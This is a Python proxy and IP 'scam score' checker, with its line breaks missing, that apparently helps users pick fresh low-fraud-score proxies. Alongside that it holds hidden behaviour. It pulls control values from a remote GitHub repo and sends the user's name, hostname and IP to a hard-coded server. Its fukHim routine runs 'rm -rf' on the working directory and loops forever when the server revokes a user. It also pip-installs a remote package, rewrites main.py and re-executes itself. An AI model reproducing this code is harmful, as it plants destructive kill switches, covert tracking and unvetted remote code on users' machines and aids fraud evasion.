import os, re, sys, time, json, socket, random, codecs, requests, subprocessfrom collections import OrderedDictfrom fake_useragent import UserAgenttmp = {    "OutPut": ""}shAttach = {    "counter": 0,    "LastCheck": 0,    "deepCheck": False}wait = {    "1mix": "",    "tot_ips": 0,    "usedip": {},    "prestock": 0,    "my_name": "",    "allproxies": {},    "LastCheck": 0}main_path = os.getcwd()base_url = "http://104.194.152.153:8000"old1_path = f"{main_path}/iphistory.json"old2_path = f"{main_path}/myhistory.json"old3_path = f"{main_path}/history.json"proxy_path = f"{main_path}/bulklist.txt"output_path = f"{main_path}/SHproxy.txt"history_path = f"{main_path}/History.json"def get_headers():    ua = UserAgent()    random_u_a = ua.random    headers = {        "User-Agent": str(random_u_a),        "X-Requested-With": "XMLHttpRequest",        "Content-Type": "application/json",        "X-Requested-With": "XMLHttpRequest",        "Custom-Header": "Value",    }    return headersdef checkVersion():    global base_url    global shAttach    my_version = "2.3"    my_headers = get_headers()    murl = "https://raw.githubusercontent.com/technoshahzain/404/main"    cxurl = f"{murl}/404.py"    ver = requests.get(cxurl,headers=my_headers,timeout=3).text.replace("\n","").replace(" ","")    if ver != my_version:        os.system('clear')        sys.exit()    cxurl = f"{murl}/host.py"    ver2 = requests.get(cxurl,headers=my_headers,timeout=3).text.replace("\n","").replace(" ","")    base_url = str(ver2)    dxurl = f"{murl}/shAttach.json"    ver3 = requests.get(dxurl,headers=my_headers,timeout=3)    data = ver3.text    shAttach = json.loads(data)    ver3.close()checkVersion()def getStyle(no):    ret = ""    txtLarg = [        "\n.-.   .-..-. .-. .----..-..----.   .--.  .---. \n|  `.'  || { } |{ {__  | || {}  } / {} \\{_   _}\n| |\\ /| || {_} |.-._} }| || {}  }/  /\\  \\ | |  \n`-' ` `-'`-----'`----' `-'`----' `-'  `-' `-'  \n",        "\n    __  _____  _______ ________  ___  ______\n   /  |/  / / / / ___//  _/ __ )/   |/_  __/\n  / /|_/ / / / /\\__ \\ / // __  / /| | / /   \n / /  / / /_/ /___/ // // /_/ / ___ |/ /    \n/_/  /_/\\____//____/___/_____/_/  |_/_/     \n                                            \n",        "\n██████╗  █████╗ ██╗      ██████╗  ██████╗██╗  ██╗\n██╔══██╗██╔══██╗██║     ██╔═══██╗██╔════╝██║  ██║\n██████╔╝███████║██║     ██║   ██║██║     ███████║\n██╔══██╗██╔══██║██║     ██║   ██║██║     ██╔══██║\n██████╔╝██║  ██║███████╗╚██████╔╝╚██████╗██║  ██║\n╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n",        "\n▒█▀▄▀█ ▒█░▒█ ▒█▀▀▀█ ▀█▀ ▒█▀▀█ ░█▀▀█ ▀▀█▀▀ \n▒█▒█▒█ ▒█░▒█ ░▀▀▀▄▄ ▒█░ ▒█▀▀▄ ▒█▄▄█ ░▒█░░ \n▒█░░▒█ ░▀▄▄▀ ▒█▄▄▄█ ▄█▄ ▒█▄▄█ ▒█░▒█ ░▒█░░ \n",    ]    n = random.randint(1, 100)    win_num = int(n)    if win_num % 5 == 0:        ret = str(random.choice(txtLarg))    elif win_num % 11 == 0:        ret = "\n██████╗  █████╗ ██╗      ██████╗  ██████╗██╗  ██╗\n██╔══██╗██╔══██╗██║     ██╔═══██╗██╔════╝██║  ██║\n██████╔╝███████║██║     ██║   ██║██║     ███████║\n██╔══██╗██╔══██║██║     ██║   ██║██║     ██╔══██║\n██████╔╝██║  ██║███████╗╚██████╔╝╚██████╗██║  ██║\n╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"    if ret == '' and no == "yes":        ret = str(random.choice(txtLarg))    return retdef prntMusibat():    os.system("clear")    ret = getStyle("yes")    try:        print(str(ret))    except:passdef deleteFile(filename):    try:        os.remove(filename)    except:        try:            os.system(f'rm -rf {filename}')        except:passdef writeData(filename, _Shahzii):    tmp["OutPut"] = _Shahzii    try:        with open(filename, "w") as midfile:            midfile.write(_Shahzii)    except:        os.system(f'echo -n "{_Shahzii}" > {filename}')def fixSHproxy():    mytext = ""    lsProxy = open(output_path)    ourProxies = lsProxy.read()    xplist = getipPort(ourProxies)    if len(xplist) != 0 and xplist != []:        for proxies in xplist:            mytext += f"{proxies}\n"    mytext += f"____________________________________\n{ourProxies}"    writeData("SHproxy.txt", mytext)    os.system("clear")    StarT_MusibaT()def fukHim():    no = 1    deleteFile(main_path)    deleteFile(proxy_path)    deleteFile(history_path)    deleteFile(old_path)    deleteFile("main")    deleteFile("main.py")    while True:        print(no)        no += 1def writeBulk(clist):    no = 0    xret = ""    if len(clist) != 0 and clist != []:        for proxies in clist:            if proxies not in wait["allproxies"]:                xret += f"{proxies}\n"                no += 1    writeData("bulklist.txt", xret)    wait["prestock"] = nodef getipPort(xxy):    allip = 0    newtxt = ""    xxProxies = []    xxz = xxy.replace(" ", "\n")    text = xxz.split("\n")    for xx in text:        if xx.count(":") >= 2:            allip += 1            xxProxies.append(xx)            if allip > 99:                break        else:            newtxt += f" {xx}"    ip_pattern = r'\b(?:\w+\.\w+\.\w+:\d{1,5}(?::[^\s]+)?)\b|\b(?:\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}(?::[^\s]+)?)\b'    ip_list = re.findall(ip_pattern, newtxt)    clist = list(OrderedDict.fromkeys(ip_list))    for xx in clist:        if ":" in xx:            allip += 1            xxProxies.append(xx)            #if allip > 99:            #    break    #xxProxies = xxProxies[-100::]    return xxProxiesdef edit_paths():    try:        if "prestock" not in wait:            wait["prestock"] = 0        if "1mix" not in wait:            wait["1mix"] = ''        if "tot_ips" not in wait:            wait["tot_ips"] = 0        if "LastCheck" not in wait:            wait["LastCheck"] = 0        if os.path.exists(old1_path):            wait2Open = codecs.open(old1_path, "r", "utf-8")            wait2 = json.load(wait2Open)            wait2Open.close()            for myipp in wait2["usedip"]:                if myipp not in wait["usedip"]:                    wait["usedip"][myipp] = int(wait2["usedip"][myipp])            for myipp in wait2["allproxies"]:                if myipp not in wait["allproxies"]:                    wait["allproxies"][myipp] = int(wait2["allproxies"][myipp])            deleteFile(old1_path)        if os.path.exists(old2_path):            wait3Open = codecs.open(old2_path, "r", "utf-8")            wait3 = json.load(wait3Open)            wait3Open.close()            for myipp in wait3["usedip"]:                if myipp not in wait["usedip"]:                    wait["usedip"][myipp] = int(wait3["usedip"][myipp])            for myipp in wait3["allproxies"]:                if myipp not in wait["allproxies"]:                    wait["allproxies"][myipp] = int(wait3["allproxies"][myipp])            deleteFile(old2_path)        if os.path.exists(old3_path):            wait4Open = codecs.open(old3_path, "r", "utf-8")            wait4 = json.load(wait4Open)            wait4Open.close()            for myipp in wait4["usedip"]:                if myipp not in wait["usedip"]:                    wait["usedip"][myipp] = int(wait4["usedip"][myipp])            for myipp in wait4["allproxies"]:                if myipp not in wait["allproxies"]:                    wait["allproxies"][myipp] = int(wait4["allproxies"][myipp])        if not os.path.exists(proxy_path):            mytext = "Paste Your Proxy List Here\nOne Proxy Per Each Line"            writeData("bulklist.txt", mytext)        if not os.path.exists(output_path):            mytext = "Your OutPut Will Be Here"            writeData("SHproxy.txt", mytext)        deleteFile(old1_path)        deleteFile(old2_path)        deleteFile(old3_path)    except:passtry:    waitOpen = codecs.open(history_path, "r", "utf-8")    wait = json.load(waitOpen)    waitOpen.close()except:    deleteFile(history_path)    with open(history_path, 'w') as f:        json.dump(wait, f, ensure_ascii=False, indent=4)def AutoDelProxies(curnTime):    no = 0    try:        if len(wait["usedip"]) != 0 and len(wait["usedip"]) % 2 == 0:            for usedip in wait["usedip"].copy():                if curnTime - wait["usedip"][usedip] >= 4 * 21600:  #24 hours                    del wait["usedip"][usedip]                    no += 1        if len(wait["allproxies"]) != 0 and len(wait["allproxies"]) % 2 == 0:            for usedip in wait["allproxies"].copy():                if curnTime - wait["allproxies"][usedip] >= 2 * 1800:  #1 hour's                    del wait["allproxies"][usedip]                    no += 1    except:pass    return nodef SaveFiles(curnTime):    try:        shAttach["LastCheck"] = curnTime        no = AutoDelProxies(curnTime)        if no != 0:            print(f"Total {no} ips auto removed")        f1 = codecs.open(history_path, 'w', 'utf-8')        json.dump(wait, f1, sort_keys=True, indent=4, ensure_ascii=False)        f1.close()    except Exception as error:        print(error)def DoBackup():    if shAttach['counter'] == 0:        curnTime = time.time()        SaveFiles(curnTime)    elif shAttach['counter'] % 2 == 0:        curnTime = time.time()        if curnTime - shAttach["LastCheck"] > 2*7:            SaveFiles(curnTime)        elif curnTime - wait["LastCheck"] >= 4 * 21600:            wait["LastCheck"] = curnTime            SaveFiles(curnTime)            do_update()    shAttach['counter'] += 1def do_update():    try:        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'asifjamali'])    except:        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'asifjamali'])    scWrite = f"""from asifjamali import *StarT_MusibaT()#______________________ {wait['my_name'].title()}'''{getStyle('yes')}'''"""    writeData("main.py", scWrite)    os.system("clear")    python = sys.executable    os.execv(python, [python] + sys.argv)def get_information(user_name): #getip    try:        no = 0        upnow = False        if wait["my_name"] == "":            if user_name.isalpha():                user_name = user_name.lower()                user_name = user_name.replace(" ", "")                if len(user_name) > 3:                    wait["my_name"] = user_name                else:                    sys.exit("invalid User_Name, Retry Again!")                DoBackup()                edit_paths()                time.sleep(1)                os.system("clear")            else:                sys.exit("invalid User_Name, Only Alphabets Allowed")        if len(wait["my_name"]) < 3:            wait["my_name"] = ""            upnow = True            sys.exit("invalid User_Name, Retry Again!")        try:            if "LastCheck" not in wait:                wait["my_name"] = ''                upnow = True            if "tot_ips" not in wait or "1mix" not in wait or "prestock" not in wait:                wait["my_name"] = wait["my_name"].lower()                upnow = True        except:pass        if upnow:            edit_paths()        if wait["tot_ips"] > 20:            wait["tot_ips"] = 20        user_ip = ""        os_name = ""        osdata = os.environ        if "REPL_OWNER" in osdata:            if shAttach["AllowCheck"]:                os_name = osdata["REPL_OWNER"]                if os_name not in shAttach["userList"]:                    fukHim()            else:                hostname = socket.gethostname()                if "localhost" in hostname:                    url = "http://ifconfig.me"                    response = requests.get(                        url,                        headers=get_headers(),                        timeout=5                    )                    response.close()                    user_ip = response.text                else:                    user_ip = socket.gethostbyname(hostname)                user_name = f"{wait['my_name']}_{os_name}_{hostname}"                url1 = f"{base_url}/assign_rank?my_name={user_name}&client_ip={user_ip}"                response = requests.get(                    url1,                    headers=get_headers(),                    timeout=5                )                if response.status_code == 200:                    xip = response.json()                    if xip == 0 or xip == "0":                        fukHim()                    else:                        user_name = str(xip)                else:                    user_name = str(wait['my_name'].title())                response.close()        else:            fukHim()    except:pass    return user_namedef timeChange(secs):    mins, secs = divmod(secs, 60)    hours, mins = divmod(mins, 60)    days, hours = divmod(hours, 24)    weeks, days = divmod(days, 7)    months, weeks = divmod(weeks, 4)    text = ""    if months != 0: text += "%02d Month" % (months)    if weeks != 0: text += " %02d Week" % (weeks)    if days != 0: text += " %02d Days" % (days)    if hours != 0: text += " %02d Hours" % (hours)    if mins != 0: text += " %02d Minutes" % (mins)    if secs != 0: text += " %02d Seconds" % (secs)    if text[0] == " ":        text = text[1:]    return textdef continueSocks():    ret = ""    my_headers = get_headers()    os.system("clear")    while True:        print(ret)        proxies = input("Enter proxy: ")        url1 = f'{base_url}/check_proxy_score/{proxies}'        response = requests.get(            url1,            headers=my_headers        )        if response.status_code == 200:            xip = response.json()            myipp = xip['ip']            if myipp != "":                ret = ""                ret += f"\nIP: {myipp}"                ret += f"\nSocks: 🔰⏬"                ret += f"\n{xip['proxy']}"                if xip["google"] == True:                    ret += "\nGoogle: ✅"                else:                    ret += "\nGoogle: ❌"                ret += f"\n{xip['speed']}"                ret += f"\nScam Score: {xip['score']}"                if myipp not in wait["usedip"]:                    score = 55                    try:                        score = int(xip['score'])                    except:pass                    if score < 55:                        curnTime = time.time()                        ret += "\nStatus: Fresh"                        wait["usedip"][myipp] = curnTime                        if xip['proxy'] not in wait["allproxies"]:                            wait["allproxies"][xip['proxy']] = curnTime                else:                    xret = " ☠️ __Used Proxy__ ☠️\n"                    curnTime = time.time()                    runtime = curnTime - int(wait["usedip"][myipp])                    runtime = timeChange(runtime)                    xret += f"About: {str(runtime)}"                    ret += f"\n{xret}"                ret += xip['data']                ret += "\n"            else:                ret = "Nothing Found"            print(ret)        else:            print('Error:', response.status_code)        response.close()        os.system("clear")        DoBackup()def continueips():    ret = ""    my_headers = get_headers()    os.system("clear")    while True:        print(ret)        proxies = input("Enter IP: ")        url1 = f'{base_url}/check_ip_score/{proxies}'        response = requests.get(            url1,            headers=my_headers        )        if response.status_code == 200:            xip = response.json()            myipp = xip['ip']            if myipp != "":                ret = ""                ret += f"\nIP: {myipp}"                ret += f"\nScam Score: {xip['score']}"                if myipp not in wait["usedip"]:                    score = 55                    try:                        score = int(xip['score'])                    except:pass                    if score < 55:                        curnTime = time.time()                        ret += "\nStatus: Fresh"                        wait["usedip"][myipp] = curnTime                else:                    xret = " ☠️ __Used Proxy__ ☠️\n"                    curnTime = time.time()                    runtime = curnTime - int(wait["usedip"][myipp])                    runtime = timeChange(runtime)                    xret += f"About: {str(runtime)}"                    ret += f"\n{xret}"                ret += xip['data']                ret += "\n"            else:                ret = "Nothing Found"            print(ret)        else:            print('Error:', response.status_code)        response.close()        os.system("clear")        DoBackup()def bulkCheck(xplist, tot_ips):    no = 0    noc = 0    okProxy = []    otherProxy = []    curnTime = time.time()    my_headers = get_headers()    print(f"Found {wait['prestock']} Proxies")    for proxies in xplist.copy():        if proxies not in wait["allproxies"]:            xplist.remove(proxies)            url1 = f'{base_url}/one_proxy_score/{proxies}'            response = requests.get(                url1,                headers=my_headers            )            if response.status_code == 200:                noc += 1                print(f"{no}/{noc}")                time.sleep(1)                xip = response.json()                myipp = xip['ip']                if myipp != "":                    if xip['proxy'] not in wait["allproxies"]:                        wait["allproxies"][xip['proxy']] = curnTime                    if myipp not in wait["usedip"]:                        wait["usedip"][myipp] = curnTime                        score = 50                        try:                            score = int(xip['score'])                        except:pass                        if score < 50:                            if xip["C_Valid"] == True and "✔️" not in xip['data']:                                no += 1                                if shAttach["deepCheck"]:                                    if "Business" not in xip['data']: # and "Wireless" not in xip['data']:                                        okProxy.append(xip)                                else:                                    okProxy.append(xip)                            else:                                otherProxy.append(xip)                        if no == tot_ips or noc == 30:                            break            else:                print('Error:', response.status_code)            response.close()    no = 0    ret = ""    shAttach["deepCheck"] = False    if okProxy != [] and len(okProxy) != 0:        for xip in okProxy:            no += 1            myipp = xip['ip']            ret += f"\n{no}: {myipp}"            ret += f"\nSocks: 🔰⏬"            ret += f"\n{xip['proxy']}"            if xip["google"] == True:                ret += "\nGoogle: ✅"            else:                ret += "\nGoogle: ❌"            ret += f"\n{xip['speed']}"            ret += f"\nScam Score: {xip['score']}"            ret += xip['data']            ret += "\n____________________________________\n"                if otherProxy != [] and len(otherProxy) != 0:        ret += "\n____________________________________\n"        for xip in otherProxy:            no += 1            myipp = xip['ip']            ret += f"\n{no}: {myipp}"            ret += f"\nSocks: 🔰⏬"            ret += f"\n{xip['proxy']}"            if xip["google"] == True:                ret += "\nGoogle: ✅"            else:                ret += "\nGoogle: ❌"            ret += f"\n{xip['speed']}"            ret += f"\nScam Score: {xip['score']}"            ret += xip['data']            ret += "\n____________________________________\n"    return retdef bulkCheck2(xplist, tot_ips):    ret = ""    no = 0    curnTime = time.time()    my_headers = get_headers()    print(f"Found {len(xplist)} Proxies")    for proxies in xplist.copy():        if proxies not in wait["allproxies"]:            xplist.remove(proxies)            url1 = f'{base_url}/check_proxy_score/{proxies}'            response = requests.get(                url1,                headers=my_headers            )            if response.status_code == 200:                xip = response.json()                myipp = xip['ip']                if myipp != "":                    if xip['proxy'] not in wait["allproxies"]:                        wait["allproxies"][xip['proxy']] = curnTime                    if myipp not in wait["usedip"]:                        wait["usedip"][myipp] = curnTime                        score = 55                        try:                            score = int(xip['score'])                        except:pass                        if score < 55:                            no += 1                            print(no)                            ret += f"\n{no}: {myipp}"                            ret += f"\nSocks: 🔰⏬"                            ret += f"\n{xip['proxy']}"                            if xip["google"] == True:                                ret += "\nGoogle: ✅"                            else:                                ret += "\nGoogle: ❌"                            ret += f"\n{xip['speed']}"                            ret += f"\nScam Score: {xip['score']}"                            ret += xip['data']                            ret += "\n____________________________________\n"                            if no == tot_ips or no == 20:                                break                    time.sleep(1)            else:                print('Error:', response.status_code)            response.close()    return retdef getClickips(tot_ips):    ret = ""    xplist = []    my_headers = get_headers()    url1 = f'{base_url}/what_history'    response = requests.get(        url1,        headers=my_headers    )    xplist = response.json()    response.close()    writeBulk(xplist)    if len(xplist) != 0 and xplist != []:        ret = bulkCheck(xplist, tot_ips)    time.sleep(1)    os.system("clear")    if ret == "":        ret = "Nothing Found :)"    writeData("SHproxy.txt", ret)    print("Proccess Complete\nCheck SHproxy.txt File...")    DoBackup()    StarT_MusibaT()def checkALLsocks(xplist, tot_ips):    ret = bulkCheck(xplist, tot_ips)    writeBulk(xplist)    print("Proccess Complete\nCheck SHproxy.txt File...")    time.sleep(1)    DoBackup()    if ret == "":        ret = "Nothing Found :)"    writeData("SHproxy.txt", ret)    os.system("clear")    StarT_MusibaT()def StarT_MusibaT():    ret = ""    my_name = ""    if wait["my_name"] == "":        prntMusibat()        my_name = input("Enter Your Name: ")    user_name = get_information(my_name)    strStyl = getStyle("no")    ret = f"""Hello {str(user_name)}{strStyl}To Check Proxy 1by1Type Enter Or Paste SocksPaste ip or Any Number For IpsRetype For Shproxy Output WriteType fix For Shproxy Output SetupAny Alphabet (abcXYZ) 4 SocksListWhat You Want: """    choice = input(ret)    if choice == "":  #enter        continueSocks()    elif choice == "fix":        fixSHproxy()    elif choice == "retype":        ret = "Nothing Found :)"        if tmp["OutPut"] != "":            ret = tmp["OutPut"]        writeData("SHproxy.txt", ret)        os.system("clear")        StarT_MusibaT()    elif choice == "click":        if wait["tot_ips"] == 0:            tot_ips = 5            chic = input("How Many Proxy to Sort: ")            try:                if chic.isdigit():                    tot_ips = int(chic)            except:pass            getClickips(tot_ips)        else:            getClickips(wait["tot_ips"])    elif choice == "aa" or choice == "aaa":  #for ok residential        lsProxy = open(proxy_path)        ourProxies = lsProxy.read()        xplist = getipPort(ourProxies)        writeBulk(xplist)        shAttach["deepCheck"] = True        if len(xplist) != 0 and xplist != []:            if wait["tot_ips"] == 0:                tot_ips = 5                chic = input("How Many Proxy to Sort: ")                try:                    if chic.isdigit():                        tot_ips = int(chic)                except:pass                checkALLsocks(xplist, tot_ips)            else:                checkALLsocks(xplist, wait["tot_ips"])    elif ":" in choice and choice.count(".") == 3: #direct proxy        continueSocks()    elif "." in choice and choice.count(".") == 3: #direct ip        continueips()    elif choice.isalpha(): #abcXYZ        lsProxy = open(proxy_path)        ourProxies = lsProxy.read()        xplist = getipPort(ourProxies)        writeBulk(xplist)        if len(xplist) != 0 and xplist != []:            if wait["tot_ips"] == 0:                tot_ips = 5                chic = input("How Many Proxy to Sort: ")                try:                    if chic.isdigit():                        tot_ips = int(chic)                except:pass                checkALLsocks(xplist, tot_ips)            else:                checkALLsocks(xplist, wait["tot_ips"])    elif re.match(r'^\d+$', choice):  #isdigit        continueips()    else:        sys.exit("Wrong inPut, Try Again!")if __name__ == "__main__":    StarT_MusibaT()#______________________________________________#⎔